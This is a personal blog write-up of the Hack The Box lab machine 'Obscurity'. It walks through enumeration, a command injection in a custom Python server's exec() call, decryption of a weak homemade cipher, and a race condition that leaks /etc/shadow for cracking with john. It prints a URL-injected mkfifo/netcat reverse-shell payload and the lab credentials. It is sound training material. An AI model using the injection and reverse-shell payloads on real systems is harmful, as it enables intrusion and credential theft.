+++
date = "2020-05-14T00:00:00Z"
tags = ["linux", "htb-medium", "rce", "python", "code-analysis", "web", "ssh"]
title = "Hack The Box - Obscurity"
images = ["https://ceso.github.io/images/htb/obscurity/obscurity-header.png"]
description = "My write-up / walkthrough for Obscurity from Hack The Box."
toc = true
aliases = [
    "/hack-the-box/obscurity/"
]
+++

{{< image src="/images/htb/obscurity/info-card.png" position="center" style="border-radius: 8px;" >}}

## Quick Summary

Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can't belive I passed!! I did an extensive write up about my experience going through it, if you still haven't read it [you can click here to go to it](https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/)

I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well...I will try to do them as my time allows me hehe.

For today I just decided to write about Obscurity, which I remember when I did it, it was pretty fun, I enjoyed it quite a lot, and it teach me some nice stuff, still remember when I did it I was struggling a bit with the Python stuff and my bro [MrBulldops](https://bullsec.xyz/) gave me a hand to understand it a bit better.

Well, Obscurity is a Linux medium machine, mostly using Python stuff and as the name says before hand, the concept in this one is security by obscurity, so it doesn't use standard web servers and so on, instead it use custom stuff in order to "provide security" by there being not public ways to exploit it, so you are forced to do some code review, think outside the box, etc.

Cutting the chit-chat let's go into the write up!

## Nmap

We start with nmap to see which ports are there open:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 16:42 EST
Nmap scan report for 10.10.10.168
Host is up (0.084s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 17 Dec 2019 21:42:22
|     Server: BadHTTPServer
|     Last-Modified: Tue, 17 Dec 2019 21:42:22
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|     <div class="sk-spinner sk-spinner-wordpress">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 17 Dec 2019 21:42:23
|     Server: BadHTTPServer
|     Last-Modified: Tue, 17 Dec 2019 21:42:23
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=12/17%Time=5DF94BCA%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Tue,\x2017\x20Dec\x202
SF:019\x2021:42:22\nServer:\x20BadHTTPServer\nLast-Modified:\x20Tue,\x2017
SF:\x20Dec\x202019\x2021:42:22\nContent-Length:\x204171\nContent-Type:\x20
SF:text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\
SF:"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>
SF:\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t
SF:<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-
SF:scale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20n
SF:ame=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Temp
SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20s
SF:tylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/bo
SF:otstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-
SF:awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templ
SF:atemo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-targe
SF:t=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n
SF:<div\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinne
SF:r-wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x2
SF:0Tue,\x2017\x20Dec\x202019\x2021:42:23\nServer:\x20BadHTTPServer\nLast-
SF:Modified:\x20Tue,\x2017\x20Dec\x202019\x2021:42:23\nContent-Length:\x20
SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x2
SF:0html>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\
SF:t<title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20c
SF:ontent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20cont
SF:ent=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\n
SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
SF:ofile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styles
SF:heet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\
SF:"scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x2
SF:0section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"
SF:sk-spinner\x20sk-spinner-wordpress\">\n");
Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
```
We got port port 22 (SSH) and 8080 (HTTP Alternative) as open, and a header "BadHTTPServer" in port 8080.

## Web enumeration

From this on, we start doing some manual web enumeration, to see if we find something interesting for us.
There are some sections in the page talking about the service by obscurity and providing information on another "products" that are built by "the company" as well some contact information.

{{< image src="/images/htb/obscurity/1-webenum.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/obscurity/2-webenum.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/obscurity/3-webenum.png" position="center" style="border-radius: 8px;" >}}

In the bottom of the page, there was a mention to "Easy Profile":

{{< image src="/images/htb/obscurity/4-webenum.png" position="center" style="border-radius: 8px;" >}}

I look up on google for this, and I found this:

{{< image src="/images/htb/obscurity/5-webenum.png" position="center" style="border-radius: 8px;" >}}

After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
I run gobuster against the server, but no luck, it didn't find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use `ffuf` (I don't like wfuzz, neither it's syntax and also I consider it to be slow compared to ffuf), [you can get ffuf here](https://github.com/ffuf/ffuf).

Then I proceed to fuzze the server and I got some interesting results:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v0.12
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 :: Output file      : obscurity-ffuf.htb
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

--- SNIP ---
develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
:: Progress: [87664/87664] :: 306 req/sec :: Duration: [0:04:46] :: Errors: 4 ::
```

`SuperSecureServer.py` under `develop` was found, which is something that sounds quite inteteresting, I open my browser and go against `http://10.10.10.168:8080/develop/SuperSecureServer.py`, and the next code is show:

```python
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK", 
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}


class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}


class Server:
    def __init__(self, host, port):    
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data 
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False
    
    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]
        
        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"


        resp = Response(
        statusNum=statusNum, statusCode=statusCode, 
        dateSent = dateSent, server = server, 
        modified = modified, length = length, 
        contentType = contentType, connectionType = connectionType, 
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            print(info.format(path))
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}
```

By doing some code-analysis, is possible to see that the function `serveDoc()` is vulnerable to a command injection in its line `exec(info.format(path)) # This is how you do string formatting, right?` this is because it's making use of [exec](https://docs.python.org/2.0/ref/exec.html) which is not even being sanitized, so in other words...there is being used a function which executes stuff at OS level while not sanitized, so this is our RCE :)

Pst: The hyperlink against the doc of `exec` points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.

## RCE

Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:

```console
http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f');'
```

{{< image src="/images/htb/obscurity/1-rce.png" position="center" style="border-radius: 8px;" >}}

## user

Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called `robert` and I list the contents of it's home:

```console
www-data@obscure:/home/robert$ ls -la /home/robert
total 60
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
lrwxrwxrwx 1 robert robert    9 Sep 28 23:28 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
drwx------ 2 robert robert 4096 Oct  5 13:09 BetterSSH
drwx------ 2 robert robert 4096 Oct  3 16:02 .cache
-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
drwx------ 3 robert robert 4096 Oct  3 22:42 .gnupg
drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
```

So, we need to compromise `robert` and in it's home lies the path...in the ls is possible to see some interesting files/directorys: `BetterSSH`, `SuperSecureCrypt.py`, `out.txt`, `check.txt` and `passwordreminder.txt`, we start by checking the content of everything:

First, the directory BetterSSH looks interesting, but we can't see what's inside, so let's take note of this as might come handy later.

`check.txt` has an interesting message:

```console
www-data@obscure:/home/robert$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct! 
```

`out.txt` looks like a ciphered message...(and from the content of `check.txt` we know they are related)

```console
www-data@obscure:/home/robert$ file out.txt
out.txt: UTF-8 Unicode text, with NEL line terminators
www-data@obscure:/home/robert$ cat out.txt
¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
```

Same with `passwordreminder.txt`:

```console
www-data@obscure:/home/robert$ file passwordreminder.txt
passwordreminder.txt: UTF-8 Unicode text, with no line terminators
www-data@obscure:/home/robert$ cat passwordreminder.txt 
´ÑÈÌÉàÙÁÑé¯·¿k
```

And finally, the code of `SuperSecureCrypt.py`:

```python
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```

By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it's correspondant plain text file in decrypt mode as key, which will give back the key that was used...
Then we proceed to execute the script with `out.txt` as input and `check.txt` as the key, saving the output (the key), under tmp as `foobar`:

```console
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k "$( cat check.txt )" -o /tmp/foobar -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to /tmp/foobar...

www-data@obscure:/home/robert$ cat /tmp/foobar    
cat /tmp/foobar
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
```
        
Now, we are able to decipher `passwordreminder.txt` providing the key we got before, getting then the content of `passwordreminder.txt` and highly likely the password of the user itself:

```console
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/pass...
www-data@obscure:/home/robert$ cat /tmp/pass
cat /tmp/pass
SecThruObsFTW
```

Now we try to do `su - robert` with the retrived password, and we are `robert` :)

```console
www-data@obscure:/home/robert$ cat /tmp/pass
cat /tmp/pass
SecThruObsFTW
www-data@obscure:/home/robert$ su - robert
su - robert
Password: SecThruObsFTW

robert@obscure:~$
```

## root

From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are `robert`, it's possible for us to see what's inside `BetterSSH`:

```console
$ ls -la BetterSSH
total 12
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
-rwxr-xr-x 1 root   root   1805 Oct  5 13:09 BetterSSH.py
```

There is a script called `BetterSSH.py`, we check it's code which is:

```python
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:

```console
robert@obscure:~/BetterSSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

By analyzing the source code, we see that once you try to login with `BetterSSH`, there is a moment where `/etc/shadow` is open in read mode (posible due to execute `BetterSSH.py` with sudo!), and is written under `/tmp/SSH` on a file, later on the temporal `/etc/shadow` written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let's try it.

On one terminal, we execute `BetterSSH.py` with sudo:

```console
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: root
Enter password: foo
Incorrect pass
```

And in another term, we execute a while true loop, that will be doing cat on the files under `/tmp/SSH`, and at some moment we confim the race condition we previously thought of as we have the content of `/etc/shadow` for the user root (remember the script is run with sudo):

```console
robert@obscure:/tmp/SSH$ while true; do cat *; done
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7
```

I grab that content of shadow and the one of `/etc/passwd`, run unshadow to generate a file compatible to john and crack it:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt > rootkey.txt
root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# john --wordlist=/usr/share/wordlists/rockyou.txt rootkey.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
--- SNIP ---
mercedes         (root)
--- SNIP ---
Session completed
```

And there we have the password of root user; `mercedes` and we succesfully login as root with it :D

```console
robert@obscure:~/BetterSSH$ su - root
Password:
root@obscure:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)

I will try to be making some time to do write ups of some other machines, until next time!!